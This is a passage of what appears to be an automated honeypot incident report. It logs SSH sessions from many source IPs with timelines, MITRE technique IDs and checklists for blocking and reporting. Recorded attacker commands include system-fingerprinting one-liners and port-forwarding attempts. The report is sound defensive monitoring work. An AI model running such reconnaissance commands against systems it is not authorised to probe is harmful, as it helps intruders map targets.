| `2026-08-17 00:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9880af836493

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 00:18 |
| **Last Seen** | 2026-08-17 00:19 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:18:38` | `cowrie.session.connect` |
| `2026-08-17 00:18:43` | `cowrie.client.version` |
| `2026-08-17 00:18:43` | `cowrie.client.kex` |
| `2026-08-17 00:19:09` | `cowrie.login.success` |
| `2026-08-17 00:19:22` | `cowrie.session.params` |
| `2026-08-17 00:19:22` | `cowrie.command.input` |
| `2026-08-17 00:19:28` | `cowrie.log.closed` |
| `2026-08-17 00:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d257f14489b

| Field | Detail |
|---|---|
| **Source IP** | `220.246.66[.]209` |
| **First Seen** | 2026-08-17 00:25 |
| **Last Seen** | 2026-08-17 00:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:25:40` | `cowrie.session.connect` |
| `2026-08-17 00:25:41` | `cowrie.client.version` |
| `2026-08-17 00:25:41` | `cowrie.client.kex` |
| `2026-08-17 00:25:42` | `cowrie.login.success` |
| `2026-08-17 00:25:43` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.66[.]209` to AbuseIPDB if not already reported
- [ ] Block `220.246.66[.]209` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2362c93337ef

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 00:32 |
| **Last Seen** | 2026-08-17 00:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:32:52` | `cowrie.session.connect` |
| `2026-08-17 00:32:52` | `cowrie.client.version` |
| `2026-08-17 00:32:52` | `cowrie.client.kex` |
| `2026-08-17 00:32:53` | `cowrie.login.success` |
| `2026-08-17 00:32:53` | `cowrie.session.params` |
| `2026-08-17 00:32:53` | `cowrie.command.input` |
| `2026-08-17 00:32:54` | `cowrie.log.closed` |
| `2026-08-17 00:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c23a65f0f00

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 00:36 |
| **Last Seen** | 2026-08-17 00:37 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:36:15` | `cowrie.session.connect` |
| `2026-08-17 00:36:20` | `cowrie.client.version` |
| `2026-08-17 00:36:20` | `cowrie.client.kex` |
| `2026-08-17 00:36:45` | `cowrie.login.success` |
| `2026-08-17 00:36:59` | `cowrie.session.params` |
| `2026-08-17 00:36:59` | `cowrie.command.input` |
| `2026-08-17 00:37:05` | `cowrie.log.closed` |
| `2026-08-17 00:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff72f159265b

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]232` |
| **First Seen** | 2026-08-17 00:39 |
| **Last Seen** | 2026-08-17 00:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:39:08` | `cowrie.session.connect` |
| `2026-08-17 00:39:09` | `cowrie.client.version` |
| `2026-08-17 00:39:09` | `cowrie.client.kex` |
| `2026-08-17 00:39:11` | `cowrie.login.success` |
| `2026-08-17 00:39:12` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]232` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18bb3e2e4697

| Field | Detail |
|---|---|
| **Source IP** | `120.234.195[.]41` |
| **First Seen** | 2026-08-17 00:43 |
| **Last Seen** | 2026-08-17 00:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:43:01` | `cowrie.session.connect` |
| `2026-08-17 00:43:02` | `cowrie.client.version` |
| `2026-08-17 00:43:02` | `cowrie.client.kex` |
| `2026-08-17 00:43:04` | `cowrie.login.success` |
| `2026-08-17 00:43:05` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.195[.]41` to AbuseIPDB if not already reported
- [ ] Block `120.234.195[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f008a0053589

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-08-17 00:43 |
| **Last Seen** | 2026-08-17 00:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:43:11` | `cowrie.session.connect` |
| `2026-08-17 00:43:12` | `cowrie.client.version` |
| `2026-08-17 00:43:12` | `cowrie.client.kex` |
| `2026-08-17 00:43:14` | `cowrie.login.success` |
| `2026-08-17 00:43:15` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b5b7304eb4

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]98` |
| **First Seen** | 2026-08-17 00:44 |
| **Last Seen** | 2026-08-17 00:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:44:24` | `cowrie.session.connect` |
| `2026-08-17 00:44:24` | `cowrie.client.version` |
| `2026-08-17 00:44:24` | `cowrie.client.kex` |
| `2026-08-17 00:44:25` | `cowrie.login.success` |
| `2026-08-17 00:44:26` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]98` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf66d6a4bae2

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-08-17 00:44 |
| **Last Seen** | 2026-08-17 00:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:44:31` | `cowrie.session.connect` |
| `2026-08-17 00:44:32` | `cowrie.client.version` |
| `2026-08-17 00:44:32` | `cowrie.client.kex` |
| `2026-08-17 00:44:34` | `cowrie.login.success` |
| `2026-08-17 00:44:34` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8087e30d51d8

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-08-17 00:45 |
| **Last Seen** | 2026-08-17 00:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:45:40` | `cowrie.session.connect` |
| `2026-08-17 00:45:41` | `cowrie.client.version` |
| `2026-08-17 00:45:41` | `cowrie.client.kex` |
| `2026-08-17 00:45:42` | `cowrie.login.success` |
| `2026-08-17 00:45:42` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87002e8bceed

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-17 00:45 |
| **Last Seen** | 2026-08-17 00:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:45:47` | `cowrie.session.connect` |
| `2026-08-17 00:45:48` | `cowrie.client.version` |
| `2026-08-17 00:45:48` | `cowrie.client.kex` |
| `2026-08-17 00:45:49` | `cowrie.login.success` |
| `2026-08-17 00:45:50` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4e176395a3

| Field | Detail |
|---|---|
| **Source IP** | `121.22.99[.]2` |
| **First Seen** | 2026-08-17 00:45 |
| **Last Seen** | 2026-08-17 00:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:45:53` | `cowrie.session.connect` |
| `2026-08-17 00:45:54` | `cowrie.client.version` |
| `2026-08-17 00:45:54` | `cowrie.client.kex` |
| `2026-08-17 00:45:56` | `cowrie.login.success` |
| `2026-08-17 00:45:57` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ecf117b4ba

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-17 00:46 |
| **Last Seen** | 2026-08-17 00:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:46:03` | `cowrie.session.connect` |
| `2026-08-17 00:46:03` | `cowrie.client.version` |
| `2026-08-17 00:46:03` | `cowrie.client.kex` |
| `2026-08-17 00:46:05` | `cowrie.login.success` |
| `2026-08-17 00:46:06` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e0a115b3c1

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 00:51 |
| **Last Seen** | 2026-08-17 00:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:51:58` | `cowrie.session.connect` |
| `2026-08-17 00:51:58` | `cowrie.client.version` |
| `2026-08-17 00:51:58` | `cowrie.client.kex` |
| `2026-08-17 00:51:59` | `cowrie.login.success` |
| `2026-08-17 00:52:00` | `cowrie.session.params` |
| `2026-08-17 00:52:00` | `cowrie.command.input` |
| `2026-08-17 00:52:00` | `cowrie.log.closed` |
| `2026-08-17 00:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a409c3f68fb

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 00:53 |
| **Last Seen** | 2026-08-17 00:54 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:53:54` | `cowrie.session.connect` |
| `2026-08-17 00:54:00` | `cowrie.client.version` |
| `2026-08-17 00:54:00` | `cowrie.client.kex` |
| `2026-08-17 00:54:26` | `cowrie.login.success` |
| `2026-08-17 00:54:40` | `cowrie.session.params` |
| `2026-08-17 00:54:40` | `cowrie.command.input` |
| `2026-08-17 00:54:45` | `cowrie.log.closed` |
| `2026-08-17 00:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a87b322102f

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-08-17 00:59 |
| **Last Seen** | 2026-08-17 00:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:59:02` | `cowrie.session.connect` |
| `2026-08-17 00:59:03` | `cowrie.client.version` |
| `2026-08-17 00:59:03` | `cowrie.client.kex` |
| `2026-08-17 00:59:04` | `cowrie.login.success` |
| `2026-08-17 00:59:04` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-422e64c7424a

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-17 00:59 |
| **Last Seen** | 2026-08-17 00:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 00:59:10` | `cowrie.session.connect` |
| `2026-08-17 00:59:11` | `cowrie.client.version` |
| `2026-08-17 00:59:11` | `cowrie.client.kex` |
| `2026-08-17 00:59:14` | `cowrie.login.success` |
| `2026-08-17 00:59:15` | `cowrie.direct-tcpip.request` |
| `2026-08-17 00:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335344d46c58

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:02 |
| **Last Seen** | 2026-08-17 01:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:02:15` | `cowrie.session.connect` |
| `2026-08-17 01:02:15` | `cowrie.client.version` |
| `2026-08-17 01:02:15` | `cowrie.client.kex` |
| `2026-08-17 01:02:18` | `cowrie.login.success` |
| `2026-08-17 01:02:20` | `cowrie.session.params` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.success` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:20` | `cowrie.command.input` |
| `2026-08-17 01:02:21` | `cowrie.log.closed` |
| `2026-08-17 01:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3fad31aa78

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:04 |
| **Last Seen** | 2026-08-17 01:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:04:25` | `cowrie.session.connect` |
| `2026-08-17 01:04:25` | `cowrie.client.version` |
| `2026-08-17 01:04:25` | `cowrie.client.kex` |
| `2026-08-17 01:04:28` | `cowrie.login.success` |
| `2026-08-17 01:04:30` | `cowrie.session.params` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.success` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:30` | `cowrie.command.input` |
| `2026-08-17 01:04:31` | `cowrie.log.closed` |
| `2026-08-17 01:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b14eb15c3dff

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:06 |
| **Last Seen** | 2026-08-17 01:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:06:51` | `cowrie.session.connect` |
| `2026-08-17 01:06:52` | `cowrie.client.version` |
| `2026-08-17 01:06:52` | `cowrie.client.kex` |
| `2026-08-17 01:06:55` | `cowrie.login.success` |
| `2026-08-17 01:06:58` | `cowrie.session.params` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.success` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:06:58` | `cowrie.command.input` |
| `2026-08-17 01:07:00` | `cowrie.log.closed` |
| `2026-08-17 01:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159d3c350088

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:09 |
| **Last Seen** | 2026-08-17 01:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:09:22` | `cowrie.session.connect` |
| `2026-08-17 01:09:22` | `cowrie.client.version` |
| `2026-08-17 01:09:22` | `cowrie.client.kex` |
| `2026-08-17 01:09:25` | `cowrie.login.success` |
| `2026-08-17 01:09:27` | `cowrie.session.params` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.success` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:27` | `cowrie.command.input` |
| `2026-08-17 01:09:28` | `cowrie.log.closed` |
| `2026-08-17 01:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
